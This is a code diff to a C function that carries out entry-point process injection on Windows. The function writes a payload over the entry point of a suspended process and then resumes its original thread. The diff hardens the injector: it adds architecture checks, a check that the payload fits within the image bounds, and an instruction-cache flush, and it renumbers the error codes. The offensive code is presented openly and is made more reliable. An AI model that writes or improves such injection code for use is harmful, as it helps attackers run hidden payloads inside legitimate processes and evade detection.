@@ -127,8 +127,42 @@ int execute_technique(
         return -7;
     }
 
+    // Validate target architecture against the build.
+#ifdef _WIN64
+    if (ntHeaders.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
+        fprintf(stderr, "[-] Architecture mismatch: build=x64 target=non-x64\n");
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return -8;
+    }
+#else
+    if (ntHeaders.FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
+        fprintf(stderr, "[-] Architecture mismatch: build=x86 target=non-x86\n");
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return -8;
+    }
+#endif
+
     // 5. Obtain AddressOfEntryPoint RVA
     DWORD entryPointRVA = ntHeaders.OptionalHeader.AddressOfEntryPoint;
+    SIZE_T imageSize = (SIZE_T)ntHeaders.OptionalHeader.SizeOfImage;
+
+    if (
+        entryPointRVA >= imageSize
+        || payload_len > (imageSize - entryPointRVA)
+    ) {
+        fprintf(
+            stderr,
+            "[-] Payload does not fit within target image bounds\n"
+        );
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return -9;
+    }
 
     // 6. Calculate RemoteEntryPoint = ImageBase + AddressOfEntryPoint
     PVOID pRemoteEntryPoint = (PVOID)((DWORD_PTR)pTargetImageBase + entryPointRVA);
@@ -142,11 +176,15 @@ int execute_technique(
         payload_len,
         &bytesWritten
     )) {
-        fprintf(stderr, "[-] Failed to write payload to EntryPoint: %d\n", GetLastError());
+        fprintf(
+            stderr,
+            "[-] Failed to write payload to EntryPoint: %lu\n",
+            (unsigned long)GetLastError()
+        );
         TerminateProcess(pi.hProcess, 0);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
-        return -8;
+        return -10;
     }
 
     if (bytesWritten != payload_len) {
@@ -154,16 +192,32 @@ int execute_technique(
         TerminateProcess(pi.hProcess, 0);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
-        return -9;
+        return -11;
+    }
+
+    if (!FlushInstructionCache(
+        pi.hProcess,
+        pRemoteEntryPoint,
+        payload_len
+    )) {
+        fprintf(
+            stderr,
+            "[-] FlushInstructionCache failed: %lu\n",
+            GetLastError()
+        );
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return -12;
     }
 
     // 8. Resume the ORIGINAL suspended primary thread
     if (ResumeThread(pi.hThread) == (DWORD)-1) {
-        fprintf(stderr, "[-] ResumeThread failed: %d\n", GetLastError());
+        fprintf(stderr, "[-] ResumeThread failed: %lu\n", GetLastError());
         TerminateProcess(pi.hProcess, 0);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
-        return -10;
+        return -13;
     }
 
     // Cleanup
